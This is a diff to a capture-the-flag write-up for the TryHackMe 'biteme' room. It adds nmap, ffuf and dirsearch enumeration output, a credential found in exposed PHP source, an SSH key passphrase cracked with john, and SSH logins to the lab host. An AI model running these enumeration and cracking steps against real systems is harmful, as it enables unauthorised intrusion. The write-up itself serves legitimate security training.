@@ -22,6 +22,23 @@ Click <a href="https://tryhackme.com/room/biteme">here </a>to access this TryHac
 
 <h3>Nmap</h3>
 
+<p>
+  
+-  2 ports open:  <code>22/ssh</code> and <code>80/http</code>.</p>
+
+
+```bash
+:~/bitemet# nmap -Pn -A -p- TargetIP
+...
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+...
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+```
+
 
 ```bash
 :~/biteme# nmap -sC -sV -T4 TargetIP
@@ -33,36 +50,91 @@ PORT   STATE SERVICE VERSION
 |_http-title: Apache2 Ubuntu Default Page: It works
 ```
 
-
 <h3>/etc/hosts</h3>
 
 ```bash
-TargetIP   biteme
+TargetIP   biteme.thm
 ```
+
+<h3>ffuf</h3>
+
+```bash
+:~/biteme# ffuf -u http://biteme.thm/indexFUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://biteme.thm/indexFUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+.html                   [Status: 200, Size: 10918, Words: 3499, Lines: 376]
+:: Progress: [39/39] :: Job [1/1] :: 21 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
+```
+
+<br>
+
+```bash
+:~/biteme# ffuf -u http://biteme.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fc 403
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://biteme.thm/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response status: 403
+________________________________________________
+
+console                 [Status: 301, Size: 314, Words: 20, Lines: 10]
+index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376]
+:: Progress: [4655/4655] :: Job [1/1] :: 125 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+```
+
+<br>
 
 <h3>dirsearch</h3>
 
 ```bash
-:~/biteme# dirsearch -u http://biteme
+:~/biteme# dirsearch -u http://biteme.thm
 ...
-[xx:xx:xx] 301 -  316B  - /console  ->  http://biteme/console/
+[xx:xx:xx] 301 -  316B  - /console  ->  http://biteme.thm/console/
 [xx:xx:xx] 200 -    2KB - /console/
 ```
 
 ```bash
-:~/biteme# dirsearch -u http://biteme/console -e txt,php,html,phps -x 403
+:~/biteme# dirsearch -u http://biteme.thm/console -e txt,php,html,phps -x 403
 ...
 [xx:xx:xx] Starting: console/
 [xx:xx:xx] 200 -    0B  - /console/config.php
-[xx:xx:xx] 301 -  320B  - /console/css  ->  http:/biteme/console/css/
+[xx:xx:xx] 301 -  320B  - /console/css  ->  http:/biteme.thm/console/css/
 [xx:xx:xx] 302 -    0B  - /console/dashboard.php  ->  index.php
 [xx:xx:xx] 200 -   25B  - /console/robots.txt
-```
-
-```bash
-:~/biteme# dirsearch -u http://biteme/console/ -e .phps -x 403
-...
-
 ```
 
 <br>
@@ -83,6 +155,114 @@ TargetIP   biteme
 
 <img width="918" height="61" alt="image" src="https://github.com/user-attachments/assets/054284d8-4496-476e-85d6-01c7c19c3304" />
 
+
+<h3>ffuf</h3>
+
+```bash
+:~/biteme# ffuf -u http://biteme.thm/console/indexFUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://biteme.thm/console/indexFUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+.php                    [Status: 200, Size: 3961, Words: 306, Lines: 40]
+.phps                   [Status: 200, Size: 9325, Words: 297, Lines: 3]
+:: Progress: [39/39] :: Job [1/1] :: 26 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+```
+
+<br>
+
+```bash
+:~/biteme# ffuf -u http://biteme.thm/console/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fc 403 -e .php,.phps
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://biteme.thm/console/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Extensions       : .php .phps 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response status: 403
+________________________________________________
+
+config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
+css                     [Status: 301, Size: 318, Words: 20, Lines: 10]
+dashboard.php           [Status: 302, Size: 0, Words: 1, Lines: 1]
+config.phps             [Status: 200, Size: 354, Words: 17, Lines: 4]
+functions.php           [Status: 200, Size: 0, Words: 1, Lines: 1]
+functions.phps          [Status: 200, Size: 2010, Words: 93, Lines: 4]
+index.phps              [Status: 200, Size: 9325, Words: 297, Lines: 3]
+index.php               [Status: 200, Size: 3961, Words: 306, Lines: 40]
+index.php               [Status: 200, Size: 3961, Words: 306, Lines: 40]
+robots.txt              [Status: 200, Size: 25, Words: 3, Lines: 2]
+securimage              [Status: 301, Size: 325, Words: 20, Lines: 10]
+:: Progress: [13965/13965] :: Job [1/1] :: 314 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+```
+
+<br>
+
+```bash
+:~/biteme# ffuf -u http://biteme.thm/console/securimage/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fr '/\..*'
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://biteme.thm/console/securimage/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Regexp: /\..*
+________________________________________________
+
+audio                   [Status: 301, Size: 331, Words: 20, Lines: 10]
+backgrounds             [Status: 301, Size: 337, Words: 20, Lines: 10]
+database                [Status: 301, Size: 334, Words: 20, Lines: 10]
+examples                [Status: 301, Size: 334, Words: 20, Lines: 10]
+.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
+images                  [Status: 301, Size: 332, Words: 20, Lines: 10]
+.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
+.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
+:: Progress: [4655/4655] :: Job [1/1] :: 49 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
+```
 
 <br>
 
@@ -110,8 +290,11 @@ TargetIP   biteme
 <h3>words.tst</h3>
 
 ```bash
-:~/biteme#wget http://biteme/console/securimage/words/words.txt
+:~/biteme# wget http://biteme.thm/console/securimage/words/words.txt
 ```
+
+<p>Navigated to <code>http://biteme.thm/console/config.phps</code>.<br><br>
+Discovered a <code>LOGIN_USER</code>:<code>6a61736f6e5f746573745f6163636f756e74</code>.</p>
 
 
 ```bash
@@ -130,8 +313,8 @@ php >
 
 ```bash
 :~/biteme# nano este
-:~/biteme#chmod 600 este
-:~/biteme#locate ssh2john
+:~/biteme# chmod 600 este
+:~/biteme# locate ssh2john
 /opt/john/ssh2john.py
 :~/biteme# john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ...
@@ -140,7 +323,7 @@ php >
 
 
 ```bash
-:~/biteme# ssh -i este jason@biteme
+:~/biteme# ssh -i este jason@biteme.thm
 ...
 jason@biteme:~$ pwd
 /home/jason
@@ -299,7 +482,7 @@ jason@biteme:~$ logout
 
 
 ```bash
-:~/biteme# ssh fred@TargetIP
+:~/biteme# ssh fred@biteme.thm
 fred@biteme's password: 
 Permission denied, please try again.
 :~/biteme# fred@biteme's password: 
@@ -310,7 +493,7 @@ fred@biteme: Permission denied (publickey,password).
 
 
 ```bash
-:~/biteme# ssh fred@TargetIP
+:~/biteme# ssh fred@biteme.thm
 fred@biteme's password: 
 Permission denied, please try again.
 :~/biteme# fred@biteme's password: 
@@ -321,7 +504,7 @@ fred@biteme: Permission denied (publickey,password).
 
 
 ```bash
-:~/biteme# ssh fred@TargetIP
+:~/biteme# ssh fred@Tbiteme.thm
 fred@biteme's password: 
 Permission denied, please try again.
 :~/biteme# fred@biteme's password: 
@@ -332,7 +515,7 @@ fred@biteme: Permission denied (publickey,password).
 
 
 ```bash
-:~/biteme# ssh -i este jason@biteme
+:~/biteme# ssh -i este jason@biteme.thm
 Enter passphrase for key 'este': 
 ...
 jason@biteme:~$ pwd
